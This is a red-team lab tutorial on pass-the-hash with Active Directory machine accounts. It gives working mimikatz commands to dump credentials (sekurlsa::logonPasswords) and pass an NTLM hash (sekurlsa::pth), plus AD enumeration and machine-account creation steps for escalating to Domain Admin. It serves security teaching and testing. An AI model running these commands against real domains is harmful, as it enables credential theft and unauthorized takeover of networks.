# Pass the Hash with Machine$ Accounts

This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of (ideally administrators/domain administrators).

This labs is based on an assumption that you have gained local administrator privileges on a workstation (machine), let's call it `WS01$`. Since you have done your AD enumeration, you notice that the WS01$ is a member of `Domain Admins` group - congratulations, you are one step away from escalating from local admin to Domain Admin and a full domain compromise.

## Execution

Finding domain computers that are members of interesting groups:

```csharp
// attacker@victim
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```

![[Screenshot from 2018-12-29 16-03-19.png]]

Of course, the same can be observed by simply checking the Domain Admins net group:

```csharp
// attacker@victim
net group "domain admins" /domain
```

![[Screenshot from 2018-12-29 17-22-59.png]]

or administrators group (not applicable to our lab, but showing as a sidenote):

```csharp
// attacker@victim
net localgroup administrators /domain
```

![[Screenshot from 2018-12-29 17-24-07.png]]

In AD, the highlighted part can be seen here:

![[Screenshot from 2018-12-29 16-36-17.png]]

Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:

```csharp
// attacker@victim
sekurlsa::logonPasswords
```

![[Screenshot from 2018-12-29 15-29-17.png]]

Let's check that our current compromised user `ws01\mantvydas` (local admin on ws01) cannot access the domain controller DC01 just yet:

![[Screenshot from 2018-12-29 15-47-10.png]]

Since WS01$ machine is a member of `Domain Admins` and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:

```csharp
// attacker@victim
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
```

![[Screenshot from 2018-12-29 15-52-35.png]]

Below shows how the machine's hash is passed which results in an elevated cmd.exe prompt. Using the elevated prompt enables us to access the domain controller as shown with `dir \\dc01\c$`:

![[Peek 2018-12-29 15-49.gif]]

## Remember

It's worth re-emphasizing that computer/machine accounts are essentially the same as user accounts and can be as dangerous if misconfigured.

Let's create a new machine account with powermad like so:

```csharp
New-MachineAccount -MachineAccount testmachine
```

![[image (162).png]]

Now, let's say someone added the testmachine$ account into Domain Admins:

```csharp
Get-NetGroupMember "domain admins" | select membern*
```

![[image (164).png]]

...if we somehow get hold of the testmachine$ password, we can escalate to a DA. We can check this by opening a new console and logging in as testmachine$ with `/netonly` flag. Note how initially the user spotless cannot list files on the DC01, but once `runas /user:testmachine$ /netonly powershell` is run and the password is provided, DC01 is no longer complaining and allows spotless listing its file system:

![[image (163).png]]

## References

[blog.secarma.co.uk/labs/using-machine-account-passwords-during-an-engagement](https://blog.secarma.co.uk/labs/using-machine-account-passwords-during-an-engagement)

[www.c0d3xpl0it.com/2018/05/machine-accounts-in-pentest-engagement.html?m=1](https://www.c0d3xpl0it.com/2018/05/machine-accounts-in-pentest-engagement.html?m=1)
